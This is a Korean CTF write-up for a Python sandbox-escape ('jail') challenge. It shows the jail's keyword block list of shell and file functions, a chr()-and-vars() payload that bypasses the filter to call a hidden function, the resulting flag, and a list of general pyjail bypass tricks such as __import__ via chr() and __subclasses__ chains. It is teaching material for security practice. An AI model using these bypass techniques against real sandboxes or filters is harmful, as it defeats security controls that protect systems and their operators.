---
title: "[UTCTF] Jail Break writeup"
published: 2026-03-15
description: utctf 롸업
category: CTF
tags: [CTF, Writeup, pyjail]
draft: false
---
# UTCTF - Jail Break 

## 문제 개요

- **카테고리**: Misc (Python Jail)
- **주제**: Python 샌드박스 탈출 + 키워드 필터 우회

### 문제 파일 (`jail.py`)

핵심 구조만 보면:

```python
_ENC = [0x37, 0x36, 0x24, ...]
_KEY = 0x42

def _secret():
    return ''.join(chr(b ^ _KEY) for b in _ENC)

BANNED = [
    "import", "os", "sys", "system", "eval",
    "open", "read", "write", "subprocess", "pty",
    "popen", "secret", "_enc", "_key"
]

SAFE_BUILTINS = {
    "print": print, "vars": vars, "getattr": getattr,
    "chr": chr, "dir": dir, ...  # globals/exec/eval 등 위험 함수 제거
}

GLOBALS = {"__builtins__": SAFE_BUILTINS, "_secret": _secret}

while True:
    code = input(">>> ")
    for word in BANNED:
        if word.lower() in code.lower():   # 입력 문자열 검사
            print("[BLOCKED]")
    exec(compile(code, "<jail>", "exec"), GLOBALS)
```
---

## 분석

### 1단계: 플래그가 어디 있나

`_secret()` 함수가 `_ENC` 배열을 `_KEY(0x42)`로 XOR해서 플래그를 반환해.
그리고 이 함수는 `GLOBALS`에 `"_secret": _secret` 으로 등록돼 있어.
즉 jail 내부에서 `_secret()`을 호출할 수 있으면 플래그를 얻을 수 있어.

### 2단계: 왜 직접 호출이 안 되나

`BANNED` 리스트에 `"secret"`이 포함돼 있어.
필터는 **입력 문자열 전체**에 대해 `word in code.lower()`로 검사하기 때문에,
입력 어딘가에 `secret`이라는 부분 문자열이 있으면 무조건 차단돼.

```
>>> _secret()          # BLOCKED - 'secret' 포함
>>> _secret            # BLOCKED - 'secret' 포함
>>> vars()['_secret']  # BLOCKED - 'secret' 포함
>>> '_' + 'secret'     # BLOCKED - 'secret' 포함
```

### 3단계: 필터 우회 방법

필터는 **소스 코드 문자열**을 검사하지, **런타임에 만들어지는 문자열**은 검사하지 않아.

즉 `chr()`로 문자를 조합해서 `_secret` 문자열을 **런타임에 생성**하면 우회 가능해.

```
'_secret' = chr(95) + 'se' + 'cret'
```

- `chr(95)` = `_` (언더스코어)
- `'se'` = `s`, `e` (각각 BANNED에 없음)
- `'cret'` = `c`, `r`, `e`, `t` (각각 BANNED에 없음)

검사 시점에는 소스 문자열에 `secret`이 없으므로 통과.
실행 시점에는 `chr(95)+'se'+'cret'` = `_secret`이 만들어짐.

### 4단계: vars()로 GLOBALS 접근

`SAFE_BUILTINS`에 `vars`가 허용돼 있어.
`vars()`는 현재 실행 컨텍스트의 namespace를 dict로 반환하는데,
`exec(code, GLOBALS)`로 실행되므로 `vars()`가 곧 `GLOBALS`야.

```python
vars()['_secret']   # == GLOBALS['_secret'] == _secret 함수
vars()['_secret']() # == _secret() 호출
```

---

## 최종 페이로드

```python
print(vars()[chr(95)+'se'+'cret']())
```

분해하면:
1. `chr(95)` → `'_'`
2. `chr(95)+'se'+'cret'` → `'_secret'` (런타임에 조합)
3. `vars()['_secret']` → `_secret` 함수 객체
4. `vars()['_secret']()` → `_secret()` 호출 → 플래그 반환
5. `print(...)` → 출력

### 필터 통과 확인

```python
BANNED = ['import','os','sys','system','eval','open','read',
          'write','subprocess','pty','popen','secret','_enc','_key']

payload = "print(vars()[chr(95)+'se'+'cret']())"
blocked = any(word in payload.lower() for word in BANNED)
# blocked = False  ← 통과!
```

---

## 실행 결과

```
==================================================
  Welcome to PyJail v1.0
  Escape to get the flag!
==================================================

>>> print(vars()[chr(95)+'se'+'cret']())
utflag{py_ja1l_3sc4p3_m4st3r}
```

---

## FLAG

```
utflag{py_ja1l_3sc4p3_m4st3r}
```

---

## 보너스: 파일을 직접 읽을 수 있었다면

서버 없이 `jail.py` 소스코드에 직접 접근 가능한 경우,
`_ENC`와 `_KEY`를 그대로 계산해도 돼.

```python
_ENC = [0x37, 0x36, 0x24, 0x2e, 0x23, 0x25, 0x39, 0x32, 0x3b, 0x1d,
        0x28, 0x23, 0x73, 0x2e, 0x1d, 0x71, 0x31, 0x21, 0x76, 0x32,
        0x71, 0x1d, 0x2f, 0x76, 0x31, 0x36, 0x71, 0x30, 0x3f]
_KEY = 0x42
print(''.join(chr(b ^ _KEY) for b in _ENC))
# utflag{py_ja1l_3sc4p3_m4st3r}
```

---

## 핵심 포인트 정리

| 항목 | 내용 |
|---|---|
| 플래그 위치 | `GLOBALS['_secret']()` 호출 결과 |
| 필터 방식 | 입력 문자열에서 banned word **부분 문자열** 검사 |
| 필터 우회 | `chr()` + 문자열 분할로 런타임에 키워드 조합 |
| namespace 접근 | `vars()` → `GLOBALS` dict 반환 → `['_secret']` 키로 함수 접근 |
| 핵심 교훈 | 소스 문자열 필터는 **런타임 문자열 생성**으로 우회 가능 |

---

## PyJail 일반적인 우회 기법 모음

실제 CTF에서 자주 쓰이는 패턴들이야.

### 1. `chr()` 조합

```python
# 'os' 우회
__import__(chr(111)+chr(115))           # chr(111)='o', chr(115)='s'
```

### 2. 문자열 분할

```python
# 'system' 우회
'sys'+'tem'
's'+'y'+'s'+'t'+'e'+'m'
```

### 3. `__class__.__mro__` 체인 (builtins 복원)

```python
# object → 서브클래스 탐색으로 위험 클래스 접근
().__class__.__mro__[-1].__subclasses__()
```

### 4. `getattr` 활용

```python
# 속성 이름을 문자열로 우회
getattr(some_obj, 'dange'+'rous_method')()
```

### 5. `f-string` 또는 `format` 활용

```python
# 런타임 문자열 생성
f"{'sec'+'ret'}"
```

---

## 관련 개념 더 공부하기

- **Python Sandbox Escape**: `__builtins__`, `__class__`, `__mro__` 체인 이해
- **SSTI (Server-Side Template Injection)**: 비슷한 런타임 탈출 개념
- **AST 기반 필터**: 문자열 검사보다 강력한 필터, `ast.parse()` 후 노드 검사

이 롸업은 `GPT`님이 작성해주셨다.

풀이가 두 가지 가능했는데, 암호학 문제를 보다가 이 문제를 보니   
XOR쪽 접근밖에 떠오르는 게 없어서 그렇게 푼 뒤 롸업 작성 도중 새 풀이를..  
그러니까 인텐을 알게 되었다고 볼 수 있다.
